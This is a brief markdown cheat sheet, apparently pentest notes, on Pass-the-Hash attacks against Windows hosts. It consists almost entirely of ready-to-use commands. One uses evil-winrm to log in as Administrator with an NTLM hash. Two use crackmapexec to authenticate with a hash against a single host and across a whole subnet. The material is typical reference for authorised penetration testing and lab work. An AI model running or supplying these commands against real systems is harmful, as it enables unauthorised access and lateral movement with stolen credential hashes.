# Pass-The-Hash

## PTH Tools

##  Evil-WinRM

Evil-WinRM Pass The Hash:

```bash
evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d3372a07ceea6'
```

## Crackmapexec

Pass The Hash against the target:

```text
cme smb 172.16.157.25 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4fa6e8d9f4a61100e51' --local-auth
```

Pass The Hash against subnet:

```bash
cme smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4fa6e8d9f4a61100e51' --local-auth
```

